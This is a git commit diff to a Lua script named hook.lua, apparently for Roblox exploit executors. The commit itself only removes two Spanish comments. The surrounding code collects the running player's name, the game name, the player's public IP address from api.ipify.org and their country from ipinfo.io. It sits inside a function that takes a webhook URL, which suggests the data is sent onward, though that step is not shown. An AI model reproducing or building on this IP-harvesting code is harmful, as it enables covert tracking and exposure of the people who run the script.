99850a7a2779a2745579f4213b4cc018a56a2fca
OneCreatorX <138682257+OneCreatorX@users.noreply.github.com>
2024-06-05 16:28:19 -0300

    Update hook.lua

--- Scripts/web/hook.lua
+++ Scripts/web/hook.lua
@@ -4,14 +4,13 @@ local function web(webhookURL)
         local playerName = game.Players.LocalPlayer.Name
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         
-        -- Obtener la dirección IP del jugador
         local req = request({
             Url = "https://api.ipify.org/",
             Method = "GET"
         })
         local ipAddress = req.Body
         
-        -- Obtener el país basado en la dirección IP
+
         local country = "Unknown"
         local response = HttpService:GetAsync("https://ipinfo.io/" .. ipAddress .. "/json")
         if response then
